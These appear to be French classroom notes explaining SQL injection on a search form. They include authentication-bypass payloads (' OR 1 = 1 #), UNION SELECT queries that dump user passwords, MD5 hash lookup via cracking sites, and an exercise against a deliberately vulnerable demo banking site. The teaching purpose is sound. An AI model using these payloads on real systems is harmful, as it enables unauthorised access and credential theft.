# Injection SQL 

j'ai un formulaire de recherche 

=> rechercher un produit va son nom
=> rechercher une catégorie de produit 

=> PS4



=> l'utilisateur va saisir du SQL 

```sql
-- récupérer tous les profils utilisateurs 
SELECT
INSERT
UPDATE
DELETE 

# l'attaquant va utiliser 2 choses essentielles 
    - syntaxe spéciale pour commenter # -- /**/ => ça permet de bloquer la suite de la requête SQL
    - apostrophe ' 
    - guillemet "

=> PS4' #
=> PS4" --


SELECT * FROM table WHERE id = '1' ; 


SELECT * FROM table WHERE id = '1' #' ; 
# le apostrophe ferme le paramètre 1
# le dièse va commenter (bloquer) la fin de la requête


1' OR 1 = 1 #
' OR 1 = 1 #
' OR 1  #


SELECT * FROM table WHERE id = '' OR 1  #' ; 
#                           FALSE OR TRUE
#                   WHERE TRUE 
# SELECT * FROM table => permet d'enlever la clause WHERE 

1' OR 1 = 1 UNION SELECT first_name , password AS last_name FROM users #
' OR 1 UNION SELECT first_name , password AS last_name FROM users #

```

etudiant 
id | nom | lastname | password
1    A      DOE         azerty
2    B      DOE         123456


prof
id | nom | lastname | password
1    c      DUPONT      azerty
3    d      DUFOUR      123456

SELECT nom, lastname FROM etudiant UNION SELECT nom, lastname FROM prof

SELECT nom, lastname FROM etudiant UNION SELECT nom, password FROM etudiant
SELECT nom, lastname FROM etudiant UNION SELECT nom, password AS lastname  FROM etudiant


=> password => e99a18c428cb38d5f260853678922e03 (hash)

=> créer à partir d'un texte => hash empreinte 
=> il n'existe pas de fonction qui permet de faire l'inverse 
md5("azerty")  => e99a18c428cb38d5f260853678922e03

=> rainbow dictionnaire => existe des sites internet qui contiennent une base de données de 

hash 

=> [crackstation](https://crackstation.net/) 

sha1
sha256
sha384

=> <https://www.dcode.fr/hash-sha1>

# cas pratique 

- aller sur le site internet suivant <http://altoro.testfire.net/>
- site codé en Java 
- simule un site bancaire / assurance
- le cas pratique est le suivant : pouvez accéder à l'espace privé du site en tant d'administrateur ??? 
- Astuce => injection SQL 
